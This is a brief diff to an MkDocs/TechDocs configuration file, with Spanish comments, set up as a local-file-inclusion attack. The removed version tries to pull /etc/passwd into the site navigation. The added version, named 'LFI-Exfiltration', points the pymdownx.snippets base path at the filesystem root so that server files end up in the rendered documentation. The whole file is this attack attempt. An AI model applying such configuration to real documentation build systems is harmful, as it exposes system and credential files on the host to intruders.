@@ -1,5 +1,6 @@
-site_name: 'example-docs'
-
-nav:
-  - Home: index.md
-  - Password: "!include /etc/passwd" # <--- Intentamos leer un archivo del VPS
+site_name: LFI-Exfiltration
+plugins:
+  - techdocs-core
+markdown_extensions:
+  - pymdownx.snippets:
+      base_path: / # Intentamos que la raíz sea el origen
